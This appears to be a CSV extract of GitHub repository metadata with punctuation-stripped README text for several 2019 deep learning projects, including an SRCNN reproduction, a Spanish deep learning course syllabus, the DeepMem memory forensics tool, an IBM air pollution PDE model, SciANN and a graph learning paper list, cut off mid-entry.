chxy95,SRCNN,n/a,SRCNN The project is reproduction of the paper Learning a Deep Convolutional Network for Image Super Resolution ECCV 2014 by Pytorch Dependence Matlab 2016 Pytorch 1 0 0 Explanation Some Matlab codes provided by the paper author url http mmlab ie cuhk edu hk projects SRCNN html The main reason for using two languages to do the project is because the different implementation of bicubic interpolation which causes the broader difference of the results when using PSNR standard Overview Overview of the network Usage Use datapro generatetrain m to generate train h5 Use datapro generatetest m to generate test h5 Train by train py python train py Convert the Pytorch model pkl to Matlab matrix mat weights pkl weights mat python convert py Use testlink getresult m to get the PSNR result and reconstruction RGB images Result Use the model weights mat can get the result Set5 Averagereconstruction PSNR 32 44dB VS bicubic PSNR 30 39dB Set14 Average reconstruction PSNR 29 05dB VS bicubic PSNR 27 54dB Image example,2019-06-28T06:01:57Z,2019-11-24T17:04:43Z,MATLAB,chxy95,User,0,4,0,36,master,chxy95,1,0,0,0,2,0,0
saintlyzero,Hawk-eye,n/a,Hawk eye Web Application to bring out hidden features like location camera angle and apparel of every frame from a video It also analyzes the generated data from the Deep Learning Models by populating Graphs Working Video Here s the actual working video https drive google com open id 1zUzjPP44IXVPTG cCQX1VTUDOb5sq6Vg Hawk eye This project was generated with Angular CLI https github com angular angular cli version 8 0 3 Development server Run ng serve for a dev server Navigate to http localhost 4200 The app will automatically reload if you change any of the source files Code scaffolding Run ng generate component component name to generate a new component You can also use ng generate directive pipe service class guard interface enum module Build Run ng build to build the project The build artifacts will be stored in the dist directory Use the prod flag for a production build Running unit tests Run ng test to execute the unit tests via Karma https karma runner github io Running end to end tests Run ng e2e to execute the end to end tests via Protractor http www protractortest org Further help To get more help on the Angular CLI use ng help or go check out the Angular CLI README https github com angular angular cli blob master README md,2019-07-17T08:47:02Z,2019-10-24T08:53:31Z,TypeScript,saintlyzero,User,1,4,3,11,master,saintlyzero#akanksha276,2,0,0,0,0,0,2
SaturdaysAI,Itinerario_DeepLearning,n/a,Binder https mybinder org badgelogo svg https mybinder org v2 gh SaturdaysAI ItinerarioDeepLearning master ItinerarioDeepLearning work in progress Itinerario oficial Deep Learning Saturdays ai Para poder graduarse en el programa AI Saturdays con la mencin Deep Learning hay que superar al menos el contenido de este itinerario Est pensado para representar poco ms del 50 del contenido de la fase code2learn en AI Saturdays Para trabajar con los notebooks puedes 1 Clonar en tu equipo este contenido git clone https github com SaturdaysAI ItinerarioDeepLearning 2 Ejecutarlo con Google Colab online 3 Ejectuarlo con Jupyter online usando mybinder boton arriba Troncal Sesion 1 ML project pipeline and basic libraries Notebooks machine learning project pipeline https github com pablotalavante ai6 madrid demos tree master session1 Lo veremos y explicaremos el sbado Slides Repaso Machine Learning https drive google com file d 1r4SBY6Dm6xjFqLH12tFb Bf7wbvoINC view Introduction to Deep Learning slides http introtodeeplearning com materials 20196S191L1 pdf Introduction do Deep Learning video https www youtube com watch v 5v1JnYvyWs index 1 list PLtBw6njQRU rwp57C0oIVt26ZgjG9NI Numpy http cs231n github io python numpy tutorial numpy Pandas video https www youtube com watch v e60ItwlZTKM Pandas tutorial https pandas pydata org pandas docs stable gettingstarted 10min html OpenCV tutorial https www pyimagesearch com 2018 07 19 opencv tutorial a guide to learn opencv Python os module https stackabuse com introduction to python os module El objetivo de esta primera semana es que todos sepamos usar las distintas libreras que utilizaremos a lo largo del curso Dependiendo de lo familiarizado que ests con estas libreras tendrs que dedicarle ms o menos tiempo pero a todos nos vendr bien como repaso y para que estemos todos en el mismo punto de partida Adems se incluye una introduccin al Deep Learning video y slides que forma parte de una asignatura del MIT y que nos introducir a lo que veremos en el curso El sbado se propondr un challenge para preparar un dataset con el que ms tarde entrenaremos un modelo de reconocimiento de imgenes Buena suerte a todos Sesion 2 Neural networks CNN and Image Classification Notebook 1 https nbviewer jupyter org github fastai course v3 blob master nbs dl1 00notebooktutorial ipynb Notebook 2 https nbviewer jupyter org github fastai course v3 blob master nbs dl1 lesson1 pets ipynb slides https github com hiromis notes blob master Lesson1 md video https course fast ai videos lesson 1 Slides Sabado https github com SaturdaysAI ItinerarioDeepLearning blob master lessons Lesson 202 20review pdf En esta segunda semana estudiaremos el problema de la clasificacin de imgenes en categoras Para ello os dejamos una serie de slides y el primer video 1h 40min para que los veais durante la semana En los enlaces que os hemos dejado tambin figura el notebook 2 que se utiliza durante el video de la leccin por si queris ir ejecutando y explorando El primer notebook contiene un pequeo resumen de cmo funciona jupyter notebook por si no habeis tenido la oportunidad de trabajar anteriormente en este entorno Sesion 3 Multiclass classification and segmentation Notebooks https nbviewer jupyter org github fastai course v3 blob master nbs dl1 lesson3 camvid ipynb slides https github com hiromis notes blob master Lesson3 md video https course fast ai videos lesson 3 Sesion 4 Recurrent Neural Networks and Genetic Algorithms Notebooks https github com pablotalavante ai6 madrid demos blob master session4 LSTM 20sesion 204 ipynb slides https docs google com presentation d 1hqYB3LRwg ntptHxH18W1ax9kBwkaZ1Pas3L7R 2Y edit video https www youtube com watch v WCUNPb 5EYI faltan los algotimos genticos Sesion 5 NLP Notebooks https github com pablotalavante ai6 madrid demos blob master session4 LSTM 20sesion 204 ipynb slides https forums fast ai t deep learning lesson 4 notes 30983 video fast ai https course fast ai videos lesson 4 video NLP https www youtube com watch v jpWqz85F4Y Sesion 6 GAN and Autoencoders slides https github com pablotalavante ai6 madrid demos blob master talk23march VAEs 2C 20GANs 20and 20CPPNs 20a 20visual 20approach 20to 20generative 20models pdf video https www youtube com watch v ondivPiwQho Resto de sesiones hasta el Demo Day estn dedicadas a la fase build2learn donde construiras un proyecto abierto con impacto social utilizando deep learning puedes ver proyectos de otras ediciones aqui http github com saturdaysai projects Este itinerario est inspirado principalmente en Practical DL for Coders de Fast ai Igualmente sintete libre de compartir o proponer mejoras levantando issues o enviando un PR Itinerario oficial Reinforcement Learning Saturdays ai Vamos a seguir el siguiente curso que nos guiar a lo largo de las distintas sesiones Full course A Free course in Deep Reinforcement Learning from beginner to expert https simoninithomas github io DeepreinforcementlearningCourse MIT Deep Learning Course Session 3 El curso del MIT de Deep Learning tiene una sesin y una prctica dedicada al Reinforcement Learning slides http introtodeeplearning com materials 20196S191L5 pdf video https www youtube com watch v i6Mi2QM3rA list PLtBw6njQRU rwp57C0oIVt26ZgjG9NI index 1 code lab3 https github com aamini introtodeeplearninglabs Theory behind Deep Learning Deep Mind El curso de David Silver de Deep Mind tiene un enfoque muy terico para las personas que quieran profundizar en el aspecto matemtico del RL slides http www0 cs ucl ac uk staff D Silver web Teaching html videos https www youtube com watch v 2pWv7GOvuf0 El link de vdeos lleva al vdeo de la primera clase El resto estn en relacionados,2019-07-25T22:47:17Z,2019-10-03T11:27:02Z,Jupyter Notebook,SaturdaysAI,Organization,2,3,3,26,master,apolmig#pablotalavante#nanirg,3,0,0,0,0,0,0
HassanDayoub,Python-for-Machine-Learning-Deep-Learning-and-Data-Science-,n/a,,2019-07-05T09:23:14Z,2019-10-14T13:23:40Z,Jupyter Notebook,HassanDayoub,User,0,3,5,8,master,HassanDayoub,1,0,0,0,0,0,0
jeffreydurieux,neurohack_dl_gan,n/a,Oldify for Brains what will your brain look like in 40 years Neurohackademy project deep learing and GANs What do these people have in common GANexamples images GANexamples png https thispersondoesnotexist com Try this website each time it will continue to generate new faces More technical information is here https www lyrn ai 2018 12 26 a style based generator architecture for generative adversarial networks STEP 1 Generating fake old brains STEP 2 Estimate brain age of fake brains but how does it work Basic architecture of our Generative Adversarial Networks GANs based on https skymind com wiki generative adversarial network gan This repo was brought to you by the amazing Deep learning and GANs team of Neurohackademy 2019 Alberto Lazari alberto lazari univ ox ac uk Anna Truzzi truzzia tcd ie Bastian David Bastian david90 gmail com Benjamin Wade benjamin sc wade gmail com Jeffrey Durieux j durieux fsw leidenuniv nl Meltem Atay meltemiatay gmail com Suniyya Waraich suniyya94 gmail com Original GAN Paper inproceedingsgoodfellow2014generative title Generative adversarial nets author Goodfellow Ian and Pouget Abadie Jean and Mirza Mehdi and Xu Bing and Warde Farley David and Ozair Sherjil and Courville Aaron and Bengio Yoshua booktitle Advances in neural information processing systems pages 2672 2680 year 2014,2019-08-05T18:10:38Z,2019-12-10T12:56:45Z,Jupyter Notebook,jeffreydurieux,User,3,3,7,160,master,lazaral#AnnaTruzzi#jeffreydurieux#meltemiatay#suniyya#bastiandavid#bscwade,7,0,0,0,0,0,45
MasterMSTC,IPTC_DeepLearning,n/a,Summer Seminar Practical Introduction to Deep Learning and Keras 15 17 July 2019 ETSIT UPM This Repository contains Presentations and Python Notebooks for the IPTC Summer Seminar Practical Introduction to Deel Learning amp Keras Organized by IPTC Information Processing and Telecommunication Center https iptc upm es Master Program Signal Processing and Machine Learning for Big Data http www mstc ssr upm es big data track,2019-07-03T06:59:52Z,2019-07-25T10:13:56Z,Jupyter Notebook,MasterMSTC,User,0,3,2,49,master,MasterMSTC,1,0,0,0,0,0,0
bitsecurerlab,DeepMem,n/a,DeepMem DeepMem is a graph based deep learning tool that automatically generates abstract representations for kernel objects and recognizes the objects from raw memory dumps in a fast and robust way Specifically we implement 1 a memory graph model that reconstructs the content and topology information of memory dumps 2 a graph neural network architecture to embed the nodes in the memory graph and 3 an object detection method that cross validates the evidence collected from different parts of objects Reference The paper of this project can be found at DeepMem https www cs ucr edu heng pubs deepmemccs18 pdf If you use this code for academic purposes please cite it as inproceedingssong2018deepmem title DeepMem Learning Graph Neural Network Models for Fast and Robust Memory Forensic Analysis author Song Wei and Yin Heng and Liu Chang and Song Dawn booktitle Proceedings of the 2018 ACM SIGSAC Conference on Computer and Communications Security pages 606 618 year 2018 organization ACM How to use it 1 Set up the environment Python Version 2 6 or 2 7 but not 3 0 apt get install pcregrep libpcre dev python dev python y Distorm3 python m pip install distorm3 More information https github com gdabah distorm https github com gdabah distorm PyCrypto pip install pycrypto More information https pypi org project pycrypto https pypi org project pycrypto TensorFlow pip install tensorflow 1 3 0 2 Get memory dumps Download the memory dumps used in our experiment from https drive google com drive u 1 folders 1SB 20rZPmSYWUo96ZjN7ue88IzBY01V8 Create a folder memorydumps in root directory of this project and move all memory dumps to that folder Or you can create your memory dumps using our tool https github com bitsecurerlab vmmemdumptool git 3 Create memory graphs cd creatememorygraphs python creatememorygraphs py 4 Train the model cd buildmodel python trainmodel py objtype ETHREAD Currently we support 6 kernel objects EPROCESS ETHREAD DRIVEROBJECT FILEOBJECT LDRDATATABLEENTRY CMKEYBODY During training the script will save the current model to the buildmodel model directory after every 100 iterations You may stop the training when the precision and recall is good enough for that kernel object 5 Testing the model cd buildmodel python testmodel py objtype ETHREAD modelpath model ETHREAD 20190705142745 struct2vecedgetype HOP3 ETHREAD 10000,2019-06-30T23:19:12Z,2019-09-24T14:54:31Z,Python,bitsecurerlab,Organization,0,3,1,2,master,weisong-ucr,1,0,0,0,0,0,1
IBM,pde-deep-learning,n/a,Deep Learning for PDE based Models Consider a complex non linear forecasting problem e g from weather and air pollution data A general issue with those problems is that forecasting methods based on solving partial differential equations PDEs require a lot of computing power in the model application phase especially for applications to large domains where domain decomposition methods are applied An idea to circumvent this issue is to use deep learning techniques to reduce the run time of the model application phase at a cost of increasing the run time of the model training phase In this project we propose domain decomposition methods to scale the deep learning model to larger domains by imposing consistency constraints during the training across sub domain boundaries We demonstrate the methods at the example of an air pollution forecasting problem which is governed by an advection diffusion process and described through a PDE If you use the code please also cite our paper https arxiv org abs 1810 09425 articlehaehnel2020using title Using Deep Learning to Extend the Range of Air Pollution Monitoring and Forecasting author Haehnel Philipp and Marecek Jakub and Monteil Julien and O Donncha Fearghal journal Journal of Computational Physics pages to appear year 2020 The data for the Dublin use case are currently not available since they are proprietary We are working on providing artificially generated replacements Any questions can be directed to Philipp Hhnel phahnel at hsph harvard edu Set up Requirements Install Python 3 We recommend anaconda from https www anaconda com download to simplify the setup of the development environment Create an anaconda environment using the supplemented environment file conda env create f environment yml This will install Python 3 7 2 and Tensorflow version 1 13 1 and all required packages in an environment called pollutionmodelling The environment file was created on MacOS Mojave 10 14 5 using GCC version clang 1001 0 46 4 from a custom build of Tensorflow supporting FMA AVX AVX2 SSE4 1 and SSE4 2 Also check https github com lakshayg tensorflow build Activate the environment using conda activate pollutionmodelling If you use an IDE e g PyCharm choose this environment as project interpreter Otherwise just run the scripts see below with that environment active from the command line The compressed database collections for the pollution measurements the traffic volumes and the weather data are located in the folder PollutionModelling data databases To use them install MongoDB Create folders sudo mkdir m 777 data sudo mkdir m 777 data db They are used by mongod as the default places to dump the databases Get the community server version at https www mongodb com download center initial true community and install it Alternatively on MacOS use brew tap mongodb brew brew install mongodb community 4 0 for that Under Windows change the directory to cd C Program FilesMongoDBServer4 0bin or whatever your path to the executables is Under Mac OS this path should automatically get added to PATH so changing to the directory is not necessary Now connect to the port 27018 mongod port 27018 Then decompress the compressed collections at PollutionModelling data databases and import them using mongoimport port 27018 db dbairquality collection file Check https docs mongodb com manual reference program mongoimport for more info If you want to look at the data and browse through it get Robo3T GUI from https robomongo org and connect to port 27018 to check out the database Requirements Part 2 not supplemented for now If you are also interested in running the PDE solver Caline 4 0 to generate some training data for the deep learning model then there is an additional requirement needed Caline is a Windows executable If on MacOS in order to run Caline install XQuartz 2 7 11 and WineHQ 4 7 Check the PollutionModelling caline winewrapper sh whether the path points to the right directory for the installed Wine version Also check https wiki winehq org MacOSFAQ for further info The first time you run Wine it may want to automatically install a few more packages After that Caline should be able to run on MacOS The Linux set up should be similar Getting Started If the set up has been successfully completed you can start running some scripts From Scratch Not all of the listed scripts and steps are supplemented in this repository We include them here to allow the user to follow and understand the steps of how the data was generated The input data has been prepared using python run processweather py python run processtraffic py python run processmeasurements py You can also just import the MongoDB collections given in data databases From the pollution measurements we find NO2 min 0 0 avg 23 61 max 259 58 PM10 min 4 5 avg 11 38 max 54 86 PM25 min 2 4 avg 6 83 max 33 54 The units are micro gram per cubic centimeter After that we can run Caline 4 0 using python run runcalinemodel py Please check within the header of the file for adjustable parameters This script estimates the traffic induced air pollution levels of NO2 PM2 5 and PM10 for defined receptors across the domain The prediction framework consisted of an air pollution dispersion model inputs of traffic volumes for a number of roadway links across the city and weather data Outputs consist of periodic estimates of pollution levels The PDE based model used is based on the Gaussian Plume model a standard model in describing the steady state transport of pollutants Caline 4 implements the Gaussian Plume model and is one of the Preferred and Recommended Air Quality Dispersion Models of the Environmental Protection Agency in the USA as of 2018 The input to the Caline model on each sub domain consists of normalized coordinates of 20 line sources padded with zeros if fewer sources are in the partition integrated traffic volumes over one hour for each source padded with zeros the average wind direction the standard deviation of wind direction the wind speed and the temperature in this hour model specific parameters such as atmospheric stability standard emission factor aerodynamic roughness coefficient standard settling velocity standard disposition velocity standard and mixing zone dimensions normalized coordinates of 20 receptors The output consists of Average NO2 PM2 5 and PM10 concentrations at the receptors in cm3 for that hour Caline 4 is limited to 20 line sources and 20 receptors per computational run The bigger domains of Dublin and the demo have been decomposed into sub domains with a maximum of 20 line sources See util utildomaindecomposition decomposedomain for more info on the decomposition The receptors are placed at random positions but in intervals at certain distances to the line sources based on the contourdistance in the parameter initialization See util utildomaindecomposition getreceptors for more info on their placement The Caline estimates are very low for low traffic volumes and are in a regime of low numerical resolution We therefore scale the traffic volumes by a scalingfactor and divide the pollution concentration outputs by it Schematically Caline traffic background Caline scalingfactor traffic scalingfactor background scalingfactor This assumes a linear dependence which we could empirically confirm to good approximation In any case for this project we are only interested in using this PDE solver as a generator for ground truth data so the physical accuracy of this step is of no major concern Caline is only modeling the contribution to the pollution levels coming from traffic and weather influence Thus we remove the default background pollution from the output again output Caline traffic weather default background default background A benchmark for one run to estimate pollution levels using Caline under Windows Total time 9541 41s Total Caline run time 9022 87s Average Caline run time for each tile hour and pollutant 0 05s Standard Deviation 0 01s The Caline script has a header with user adjustable parameters You may want to run the Caline model with a variety of settings before pre processing the estimates and train the machine learning model Doing so generates a denser data set The receptor positions are determined randomly for each new run For the publication runs have been carried out with receptors at distances of multiples of 6 11 17 20 26 33 37 47 77 105 125 160 550 600 750 meters away from the line sources for the Dublin data and 5 6 7 8 9 10 11 13 17 27 37 53 71 101 103 for the demo From the Database The supplemented database contains all generated data up to this point Next up is the pre processing for the training of the ML model This involves rescaling all different input units to lie within the same order of magnitude Check the headers of the files for user adjustable parameters python run runpreprocessing py Within the user chosen parameters you can select the tags for identifying the Caline data in the collection which has the identifiers runtag str anything but we used the date of the run in format YYYY MM DD case str Dublin or Demo contourdistance int interval distance for placing receptors from line sources From the collection different pre processing runs are identified via the case Dublin or Demo as given in the getparameters L 99 and meshsize which is the length of the sub domain selection in L 86 So it would be possible to have a couple of pre processed data together without creating and managing new collections 1 the Demo 2 the full Dublin example 3 some subset of the Dublin example restricted to a number of tiles It is advisable though to create a new collection for each setting We can now run the deep learning model python run runmlmodel py Evaluation of the run can be done with the help of the many plotting scripts python plotting plotbenchmarks py python plotting plotcc py They plot graphs of the accuracy metrics and of the consistency constraints python plotting plotcontourmaps py python plotting plottimeseries py They visualize the spatial and temporal distribution of the data comparing the Caline results with the ones learned by the ML model Visualizing the traffic data weather data and measurement data can be done using the scripts python plotting plotmaps py python plotting plotstations py python plotting plottrafficvolumes py python plotting plotweatherdata py Check the header of each file for more detail Thank you Thank you for your interest in this project Don t hesitate to contact us if you have any questions comments or concerns,2019-07-24T18:23:56Z,2019-09-23T02:18:11Z,Python,IBM,Organization,3,3,3,76,master,phylyc#jmarecek#FearghalOD#kant#stevemar,5,0,0,1,3,0,6
sciann,sciann,n/a,SciANN Neural Networks for Scientific Computations SciANN is a Keras wrapper for scientific computations and physics informed deep learning New to SciANN SciANN is a high level artificial neural networks API written in Python using Keras https keras io and TensorFlow https www tensorflow org backends It is developed with a focus on enabling fast experimentation with different networks architectures and with emphasis on scientific computations physics informed deep learing and inversion Being able to start deep learning in a very few lines of code is key to doing good research Use SciANN if you need a deep learning library that Allows for easy and fast prototyping Allows the use of complex deep neural networks Takes advantage TensorFlow and Keras features including seamlessly running on CPU and GPU Read the documentation at SicANN com https sciann com Cite SciANN in your publications if it helps your research mischaghighat2019sciann title SciANN A Keras wrapper for scientific computations and physics informed deep learning using artificial neural networks author Haghighat Ehsan and Juanes Ruben howpublished urlhttps sciann com url https github com sciann sciann git year 2019 SciANN is compatible with Python 2 7 3 6 Getting started 30 seconds to SciANN The core data structure of SciANN is a Functional a way to organize inputs Variables and outputs Fields of a network Targets are imposed on Functional instances using Constraint s The SciANN model SciModel is formed from inputs Variables and targets Constraints The model is then trained by calling the solve function Here is the simplest SciANN model python from sciann import Variable Functional SciModel from sciann constraints import Data x Variable x y Functional y ytrue is a Numpy array of N 1 with N as number of samples model SciModel x Data y This is associated to the simplest neural network possible i e a linear relation between the input variable x and the output variable y with only two parameters to be learned Plotting a network is as easy as passing a filename to the SciModel python model SciModel x Data y plottofile filepath Once your model looks good perform the learning with solve python xtrue is a Numpy array of N 1 with N as number of samples model train xtrue ytrue epochs 5 batchsize 32 You can iterate on your training data in batches and in multiple epochs Please check Keras https keras io documentation on model fit for more information on possible options You can evaluate the model any time on new data python classes model predict xtest batchsize 128 In the examples folder https github com sciann sciann tree master examples of the repository you will find some examples of Linear Elasticity Flow Flow in Porous Media etc Installation Before installing SciANN you need to install the TensorFlow and Keras TensorFlow installation instructions https www tensorflow org install Keras installation instructions https keras io installation You may also consider installing the following optional dependencies cuDNN https docs nvidia com deeplearning sdk cudnn install recommended if you plan on running Keras on GPU HDF5 and h5py http docs h5py org en latest build html required if you plan on saving Keras SciANN models to disk graphviz https graphviz gitlab io download and pydot https github com erocarrera pydot used by visualization utilities https keras io visualization to plot model graphs Then you can install SciANN itself There are two ways to install SciANN Install SciANN from PyPI recommended Note These installation steps assume that you are on a Linux or Mac environment If you are on Windows you will need to remove sudo to run the commands below sh sudo pip install sciann If you are using a virtualenv you may want to avoid using sudo sh pip install sciann Alternatively install SciANN from the GitHub source First clone SciANN using git sh git clone https github com sciann sciann git Then cd to the SciANN folder and run the install command sh sudo python setup py install or sh sudo pip install Why this name SciANN Scientific Computational with Artificial Neural Networks Scientific computations include solving ODEs PDEs Integration Differentitation Curve Fitting etc,2019-07-20T20:13:06Z,2019-12-07T08:41:16Z,Python,sciann,User,1,3,2,36,master,sciann#ehsanhaghighat,2,0,0,2,1,0,0
JustinYuu,Deeplearning-study,n/a,Deeplearning study My own codes while learning deeplearning,2019-06-29T08:07:49Z,2019-11-09T05:43:51Z,Jupyter Notebook,JustinYuu,User,0,3,2,71,master,JustinYuu,1,0,0,0,0,0,0
asw3asw,DeepGraphLearning,n/a,Literature of Deep Learning for Graphs This is a paper list about deep learning for graphs contents local depth 2 sectnum depth 2 role author emphasis role venue strong role keyword emphasis Node Representation Learning Unsupervised Node Representation Learning DeepWalk Online Learning of Social Representations author Bryan Perozzi Rami Al Rfou Steven Skiena venue KDD 2014 keyword Node classification Random walk Skip gram LINE Large scale Information Network Embedding author Jian Tang Meng Qu Mingzhe Wang Ming Zhang Jun Yan Qiaozhu Mei venue WWW 2015 keyword First order Second order Node classification GraRep Learning Graph Representations with Global Structural Information author Shaosheng Cao Wei Lu Qiongkai Xu venue CIKM 2015 keyword High order SVD node2vec Scalable Feature Learning for Networks author Aditya Grover Jure Leskovec venue KDD 2016 keyword Breadth first Search Depth first Search Node Classification Link Prediction Variational Graph Auto Encoders author Thomas N Kipf Max Welling venue arXiv 1611 Scalable Graph Embedding for Asymmetric Proximity author Chang Zhou Yuqiong Liu Xiaofei Liu Zhongyi Liu Jun Gao venue AAAI 2017 Fast Network Embedding Enhancement via High Order Proximity Approximation author Cheng Yang Maosong Sun Zhiyuan Liu Cunchao Tu venue IJCAI 2017 struc2vec Learning Node Representations from Structural Identity author Leonardo F R Ribeiro Pedro H P Savarese Daniel R Figueiredo venue KDD 2017 keyword Structural Identity Poincar Embeddings for Learning Hierarchical Representations author Maximilian Nickel Douwe Kiela venue NIPS 2017 VERSE Versatile Graph Embeddings from Similarity Measures author Anton Tsitsulin Davide Mottin Panagiotis Karras Emmanuel Mller venue WWW 2018 Network Embedding as Matrix Factorization Unifying DeepWalk LINE PTE and node2vec author Jiezhong Qiu Yuxiao Dong Hao Ma Jian Li Kuansan Wang Jie Tang venue WSDM 2018 Learning Structural Node Embeddings via Diffusion Wavelets author Claire Donnat Marinka Zitnik David Hallac Jure Leskovec venue KDD 2018 Adversarial Network Embedding author Quanyu Dai Qiang Li Jian Tang Dan Wang venue AAAI 2018 GraphGAN Graph Representation Learning with Generative Adversarial Nets author Hongwei Wang Jia Wang Jialin Wang Miao Zhao Weinan Zhang Fuzheng Zhang Xing Xie Minyi Guo venue AAAI 2018 A General View for Network Embedding as Matrix Factorization author Xin Liu Tsuyoshi Murata Kyoung Sook Kim Chatchawan Kotarasu Chenyi Zhuang venue WSDM 2019 Deep Graph Infomax author Petar Velikovi William Fedus William L Hamilton Pietro Li Yoshua Bengio R Devon Hjelm venue ICLR 2019 NetSMF Large Scale Network Embedding as Sparse Matrix Factorization author Jiezhong Qiu Yuxiao Dong Hao Ma Jian Li Chi Wang Kuansan Wang Jie Tang venue WWW 2019 Adversarial Training Methods for Network Embedding author Quanyu Dai Xiao Shen Liang Zhang Qiang Li Dan Wang venue WWW 2019 vGraph A Generative Model for Joint Community Detection and Node Representation Learning author Fan Yun Sun Meng Qu Jordan Hoffmann Chin Wei Huang Jian Tang venue arXiv 1906 Node Representation Learning in Heterogeneous Graphs Learning Latent Representations of Nodes for Classifying in Heterogeneous Social Networks author Yann Jacob Ludovic Denoyer Patrick Gallinari venue WSDM 2014 PTE Predictive Text Embedding through Large scale Heterogeneous Text Networks author Jian Tang Meng Qu Qiaozhu Mei venue KDD 2015 keyword Text Embedding Heterogeneous Text Graphs Heterogeneous Network Embedding via Deep Architectures author Shiyu Chang Wei Han Jiliang Tang Guo Jun Qi Charu C Aggarwal Thomas S Huang venue KDD 2015 Network Representation Learning with Rich Text Information author Cheng Yang Zhiyuan Liu Deli Zhao Maosong Sun Edward Chang venue AAAI 2015 Max Margin DeepWalk Discriminative Learning of Network Representation author Cunchao Tu Weicheng Zhang Zhiyuan Liu Maosong Sun venue IJCAI 2016 metapath2vec Scalable Representation Learning for Heterogeneous Networks author Yuxiao Dong Nitesh V Chawla Ananthram Swami venue KDD 2017 Meta Path Guided Embedding for Similarity Search in Large Scale Heterogeneous Information Networks author Jingbo Shang Meng Qu Jialu Liu Lance M Kaplan Jiawei Han Jian Peng venue arXiv 2016 HIN2Vec Explore Meta paths in Heterogeneous Information Networks for Representation Learning author Tao yang Fu Wang Chien Lee Zhen Lei venue CIKM 2017 An Attention based Collaboration Framework for Multi View Network Representation Learning author Meng Qu Jian Tang Jingbo Shang Xiang Ren Ming Zhang Jiawei Han venue CIKM 2017 Multi view Clustering with Graph Embedding for Connectome Analysis author Guixiang Ma Lifang He Chun Ta Lu Weixiang Shao Philip S Yu Alex D Leow Ann B Ragin venue CIKM 2017 Attributed Signed Network Embedding author Suhang Wang Charu Aggarwal Jiliang Tang Huan Liu venue CIKM 2017 CANE Context Aware Network Embedding for Relation Modeling author Cunchao Tu Han Liu Zhiyuan Liu Maosong Sun venue ACL 2017 PME Projected Metric Embedding on Heterogeneous Networks for Link Prediction author Hongxu Chen Hongzhi Yin Weiqing Wang Hao Wang Quoc Viet Hung Nguyen Xue Li venue KDD 2018 BiNE Bipartite Network Embedding author Ming Gao Leihui Chen Xiangnan He Aoying Zhou venue SIGIR 2018 StarSpace Embed All The Things author Ledell Wu Adam Fisch Sumit Chopra Keith Adams Antoine Bordes Jason Weston venue AAAI 2018 Exploring Expert Cognition for Attributed Network Embedding author Xiao Huang Qingquan Song Jundong Li Xia Hu venue WSDM 2018 SHINE Signed Heterogeneous Information Network Embedding for Sentiment Link Prediction author Hongwei Wang Fuzheng Zhang Min Hou Xing Xie Minyi Guo Qi Liu venue WSDM 2018 Multidimensional Network Embedding with Hierarchical Structures author Yao Ma Zhaochun Ren Ziheng Jiang Jiliang Tang Dawei Yin venue WSDM 2018 Curriculum Learning for Heterogeneous Star Network Embedding via Deep Reinforcement Learning author Meng Qu Jian Tang Jiawei Han venue WSDM 2018 Generative Adversarial Network based Heterogeneous Bibliographic Network Representation for Personalized Citation Recommendation author Xiaoyan Cai Junwei Han Libin Yang venue AAAI 2018 ANRL Attributed Network Representation Learning via Deep Neural Networks author Zhen Zhang Hongxia Yang Jiajun Bu Sheng Zhou Pinggang Yu Jianwei Zhang Martin Ester Can Wang venue AAAI 2018 Efficient Attributed Network Embedding via Recursive Randomized Hashing author Wei Wu Bin Li Ling Chen Chengqi Zhang venue IJCAI 2018 Deep Attributed Network Embedding author Hongchang Gao Heng Huang venue IJCAI 2018 Co Regularized Deep Multi Network Embedding author Jingchao Ni Shiyu Chang Xiao Liu Wei Cheng Haifeng Chen Dongkuan Xu Xiang Zhang venue WWW 2018 Easing Embedding Learning by Comprehensive Transcription of Heterogeneous Information Networks author Yu Shi Qi Zhu Fang Guo Chao Zhang Jiawei Han venue KDD 2018 Meta Graph Based HIN Spectral Embedding Methods Analyses and Insights author Carl Yang Yichen Feng Pan Li Yu Shi Jiawei Han venue ICDM 2018 SIDE Representation Learning in Signed Directed Networks author Junghwan Kim Haekyu Park Ji Eun Lee U Kang venue WWW 2018 Node Representation Learning in Dynamic Graphs Know evolve Deep temporal reasoning for dynamic knowledge graphs author Rakshit Trivedi Hanjun Dai Yichen Wang Le Song venue ICML 2017 Dyngem Deep embedding method for dynamic graphs author Palash Goyal Nitin Kamra Xinran He Yan Liu venue ICLR 2017 Workshop Attributed network embedding for learning in a dynamic environment author Jundong Li Harsh Dani Xia Hu Jiliang Tang Yi Chang Huan Liu venue CIKM 2017 Dynamic Network Embedding by Modeling Triadic Closure Process author Lekui Zhou Yang Yang Xiang Ren Fei Wu Yueting Zhuang venue AAAI 2018 DepthLGP Learning Embeddings of Out of Sample Nodes in Dynamic Networks author Jianxin Ma Peng Cui Wenwu Zhu venue AAAI 2018 TIMERS Error Bounded SVD Restart on Dynamic Networks author Ziwei Zhang Peng Cui Jian Pei Xiao Wang Wenwu Zhu venue AAAI 2018 Dynamic Embeddings for User Profiling in Twitter author Shangsong Liang Xiangliang Zhang Zhaochun Ren Evangelos Kanoulas venue KDD 2018 Dynamic Network Embedding An Extended Approach for Skip gram based Network Embedding author Lun Du Yun Wang Guojie Song Zhicong Lu Junshan Wang venue IJCAI 2018 DyRep Learning Representations over Dynamic Graphs author Rakshit Trivedi Mehrdad Farajtabar Prasenjeet Biswal Hongyuan Zha venue ICLR 2019 Predicting Dynamic Embedding Trajectory in Temporal Interaction Networks author Srijan Kumar Xikun Zhang Jure Leskovec venue KDD2019 Knowledge Graph Embedding Translating Embeddings for Modeling Multi relational Data author Antoine Bordes Nicolas Usunier Alberto Garcia Duran Jason Weston Oksana Yakhnenko venue NIPS 2013 Knowledge Graph Embedding by Translating on Hyperplanes author Zhen Wang Jianwen Zhang Jianlin Feng Zheng Chen venue AAAI 2014 Learning Entity and Relation Embeddings for Knowledge Graph Completion author Yankai Lin Zhiyuan Liu Maosong Sun Yang Liu Xuan Zhu venue AAAI 2015 Knowledge Graph Embedding via Dynamic Mapping Matrix author Guoliang Ji Shizhu He Liheng Xu Kang Liu Jun Zha venue ACL 2015 Modeling Relation Paths for Representation Learning of Knowledge Bases author Yankai Lin Zhiyuan Liu Huanbo Luan Maosong Sun Siwei Rao Song Liu venue EMNLP 2015 Embedding Entities and Relations for Learning and Inference in Knowledge Bases author Bishan Yang Wen tau Yih Xiaodong He Jianfeng Gao Li Deng venue ICLR 2015 Holographic Embeddings of Knowledge Graphs author Maximilian Nickel Lorenzo Rosasco Tomaso Poggio venue AAAI 2016 Complex Embeddings for Simple Link Prediction author Tho Trouillon Johannes Welbl Sebastian Riedel ric Gaussier Guillaume Bouchard venue ICML 2016 Modeling Relational Data with Graph Convolutional Networks author Michael 